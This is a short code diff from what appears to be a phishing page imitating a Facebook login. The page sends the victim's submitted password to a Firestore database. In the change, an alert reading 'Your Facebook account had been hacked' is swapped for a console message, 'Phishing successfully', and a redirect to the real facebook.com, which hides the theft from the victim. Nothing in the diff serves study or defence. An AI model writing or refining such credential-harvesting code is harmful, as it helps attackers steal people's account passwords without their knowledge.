@@ -33,7 +33,7 @@
       import {
         getFirestore,
         addDoc,
-        collection
+        collection,
       } from "https://www.gstatic.com/firebasejs/9.21.0/firebase-firestore.js";
       // import { getAnalytics } from "https://cdnjs.cloudflare.com/ajax/libs/firebase/9.21.0/firebase-analytics-compat.min.js";
       // TODO: Add SDKs for Firebase products that you want to use
@@ -71,8 +71,8 @@
           password: password,
         })
           .then((data) => {
-            console.log("Document written with ID: ", data);
-            alert("Your Facebook account had been hacked :))")
+            console.log("Phishing successfully 🐠");
+            window.location.href = "https://www.facebook.com/";
           })
           .catch((err) => {
             console.log("Have error: ", err);
